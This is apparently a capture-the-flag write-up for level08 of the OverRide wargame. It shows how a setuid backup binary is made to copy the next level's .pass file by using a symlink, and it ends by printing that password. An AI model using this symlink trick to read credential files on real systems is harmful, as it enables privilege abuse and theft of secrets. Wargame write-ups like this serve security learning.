This binary will take a file as an argument, write a copy to a directory called "backups", and write the status in a .log file inside this directory :

    level08@OverRide:~$ echo "hello world" > bbbb
    level08@OverRide:~$ ./level08 bbbb
    level08@OverRide:~$ cat backups/bbbb 
    hello world
    level08@OverRide:~$ cat backups/.log 
    LOG: Starting back up: bbbb
    LOG: Finished back up bbbb

What if we try with the level09 password file ?

    level08@OverRide:~$ ./level08 "../level09/.pass"
    ERROR: Failed to open ./backups/../level09/.pass

It seems we successfuly opened the password file, but the issue lies in how the backup is being done. Using relative paths seems to mess it up. Let's try with absolute paths :

    level08@OverRide:~$ ./level08 /home/users/level09/.pass
    ERROR: Failed to open ./backups//home/users/level09/.pass

It seems the directories are at fault here. If we could get rid of them, the thing should work. That's when symlinks come in handy :

    level08@OverRide:~$ ln -s ../level09/.pass exploit
    level08@OverRide:~$ ./level08 exploit
    level08@OverRide:~$ cat backups/exploit 
    fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
